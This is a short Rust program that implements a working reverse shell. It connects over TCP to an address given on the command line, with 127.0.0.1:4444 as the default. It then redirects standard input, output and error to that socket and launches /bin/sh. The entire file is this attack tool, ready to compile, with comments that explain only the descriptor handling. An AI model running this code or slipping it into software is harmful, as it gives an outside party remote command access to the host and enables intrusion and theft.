use std::{
    env,
    ffi::CString,
    os::fd::{AsRawFd, FromRawFd, IntoRawFd, OwnedFd},
    str::FromStr,
};

use anyhow::Result;
use nix::{
    sys::socket::{AddressFamily, SockFlag, SockType, SockaddrIn, connect, socket},
    unistd::{dup2, execv},
};

fn main() -> Result<()> {
    let addr = env::args()
        .nth(1)
        .unwrap_or_else(|| "127.0.0.1:4444".to_string());
    let addr = SockaddrIn::from_str(&addr)?;

    let sock = socket(
        AddressFamily::Inet,
        SockType::Stream,
        SockFlag::empty(),
        None,
    )?;

    connect(sock.as_raw_fd(), &addr)?;

    // helper function to duplicate the socket file descriptor to a specific target file descriptor.
    let dup_to = |target: i32| -> Result<()> {
        // create an OwnedFd from the target file descriptor.
        let mut owned = unsafe { OwnedFd::from_raw_fd(target) };
        // duplicate the socket file descriptor to the target file descriptor.
        dup2(&sock, &mut owned)?;
        // leak the OwnedFd to ensure the underlying file descriptor remains open.
        let _ = owned.into_raw_fd();
        Ok(())
    };

    // redirect stdin (0), stdout (1), and stderr (2) to the socket.
    dup_to(0)?;
    dup_to(1)?;
    dup_to(2)?;

    let shell = CString::new("/bin/sh")?;
    execv(&shell, &[&shell])?;

    Ok(())
}
